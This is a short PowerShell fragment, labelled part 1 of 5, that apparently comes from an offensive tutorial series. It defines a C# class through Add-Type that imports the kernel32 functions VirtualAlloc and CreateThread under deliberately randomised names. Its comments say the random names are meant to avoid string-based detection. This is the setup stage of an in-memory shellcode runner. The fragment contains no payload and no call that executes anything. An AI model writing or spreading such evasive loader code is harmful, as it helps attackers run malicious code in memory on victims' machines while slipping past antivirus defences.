#ran1
# Part 1 of 5 - Creates the Win32 APIs as a Type Function to be added
# Uses random name for they Add-Type Function calling the Win32 API
# Uses further random sting names for the API calls which are defined in the class using specific EntryPoints

$earhatrjhsrykjxfgerwwgwegr = @"
using System;
using System.Runtime.InteropServices;

public class earhatrjhsrykjxfgerwwgwegr {
    [DllImport("kernel32", EntryPoint="VirtualAlloc")]
    public static extern IntPtr onrwuighuoaeribieel(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32", CharSet=CharSet.Ansi, EntryPoint="CreateThread")]
    public static extern IntPtr nosfubnwe0rpibnsp(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@